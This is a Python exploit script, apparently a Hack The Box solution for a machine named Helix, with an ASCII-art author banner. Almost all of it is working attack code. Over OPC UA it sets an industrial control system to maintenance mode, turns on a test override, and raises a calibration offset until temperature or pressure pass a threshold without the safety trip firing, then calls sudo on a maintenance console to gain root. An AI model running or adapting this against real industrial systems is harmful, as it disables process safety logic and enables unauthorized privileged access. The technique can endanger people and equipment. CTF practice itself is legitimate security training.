#!/usr/bin/env python3
# ==========================================
# HELIX HTB ROOT EXPLOIT
# Author : MAVERICK-VF142
# Exploit: OPC UA Maintenance Window Abuse
# ==========================================

import asyncio
import os
from asyncua import Client, ua

URL = "opc.tcp://127.0.0.1:4840/helix/"

async def main():
    async with Client(url=URL) as c:
        ns = await c.get_namespace_index("urn:helix:ot")
        N = lambda i: c.get_node(f"ns={ns};i={i}")

        Mode   = N(12)
        TestOv = N(13)
        Calib  = N(6)

        Temp   = N(4)
        Press  = N(5)
        Trip   = N(10)

        print("""
███╗   ███╗ █████╗ ██╗   ██╗███████╗██████╗ ██╗ ██████╗██╗  ██╗
████╗ ████║██╔══██╗██║   ██║██╔════╝██╔══██╗██║██╔════╝██║ ██╔╝
██╔████╔██║███████║██║   ██║█████╗  ██████╔╝██║██║     █████╔╝
██║╚██╔╝██║██╔══██║╚██╗ ██╔╝██╔══╝  ██╔══██╗██║██║     ██╔═██╗
██║ ╚═╝ ██║██║  ██║ ╚████╔╝ ███████╗██║  ██║██║╚██████╗██║  ██╗
╚═╝     ╚═╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝╚═╝ ╚═════╝╚═╝  ╚═╝

               MAVERICK-VF142
        Helix HTB Automated Root Chain
""")

        print("[*] Switching mode -> MAINTENANCE")
        await Mode.write_value(
            ua.Variant("MAINTENANCE", ua.VariantType.String)
        )

        print("[*] Enabling test override")
        await TestOv.write_value(
            ua.Variant(True, ua.VariantType.Boolean)
        )

        for off in (12.0, 16.0, 20.0, 25.0, 30.0):
            print(f"[*] Calibration Offset -> {off}")

            await Calib.write_value(
                ua.Variant(off, ua.VariantType.Double)
            )

            await asyncio.sleep(2)

            t = await Temp.read_value()
            p = await Press.read_value()
            tr = await Trip.read_value()

            print(f"[+] Temp={t} Pressure={p} Trip={tr}")

            if (t >= 295 or p >= 73) and not tr:
                print("\n[+] Maintenance Window OPEN")
                print("[+] Rooting Helix...")
                os.system("sudo /usr/local/sbin/helix-maint-console")
                return

        print("[-] Exploit failed")

asyncio.run(main())
